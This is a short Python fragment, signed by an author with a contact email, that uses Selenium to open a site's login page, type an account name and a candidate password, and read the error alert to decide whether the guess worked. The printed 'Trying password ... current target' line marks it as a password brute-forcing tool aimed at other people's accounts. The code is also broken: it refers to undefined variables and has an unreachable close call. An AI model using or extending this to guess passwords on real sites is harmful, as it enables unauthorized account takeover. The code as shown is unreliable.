# Coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver import ActionChains


optionss = webdriver.ChromeOptions()
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
driver = webdriver.Chrome(ChromeDriverManager().install())
def site_login(url,account,password):
    print("Trying password", passw, "current target is ",target, "on url", url)
    driver.get(url)
    driver.find_element_by_class_name("nick").send_keys(account)
    driver.find_element_by_class_name('pass').send_keys(password)
    driver.find_element_by_class_name("cont.button-border").click()
    try:
        x = driver.find_element_by_class_name("alert.alert-danger")
        return password, False
    except NoSuchElementException:
        return password, True
    driver.close()
